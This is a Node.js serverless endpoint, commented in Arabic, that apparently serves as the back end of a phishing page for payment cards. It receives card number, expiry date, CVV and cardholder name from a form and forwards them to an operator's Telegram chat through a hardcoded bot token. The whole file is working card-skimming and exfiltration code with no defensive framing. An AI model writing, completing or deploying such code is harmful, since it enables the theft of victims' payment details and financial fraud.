// api/send.js
module.exports = async (req, res) => {
    // التحقق من أن طريقة الطلب هي POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // استخراج البيانات من الطلب
    const { cardNumber, expiryDate, cvv, cardHolder } = req.body;

    const botToken = '7631958963:AAERq296qX2l-yZeDAQu0YgvTwIMDSexjvU';
    const chatId = '5720331540';

    // تنسيق الرسالة
    const message = `
    ⚡️ تم إدخال بيانات بطاقة جديدة!
    رقم البطاقة: ${cardNumber}
    تاريخ الانتهاء: ${expiryDate}
    رمز الأمان (CVV): ${cvv}
    اسم حامل البطاقة: ${cardHolder}
    `;

    // إرسال الرسالة إلى تيليجرام
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const telegramResponse = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        if (telegramResponse.ok) {
            res.status(200).json({ success: true, message: 'Message sent successfully' });
        } else {
            res.status(500).json({ error: 'Failed to send message to Telegram' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Internal Server Error' });
    }
};
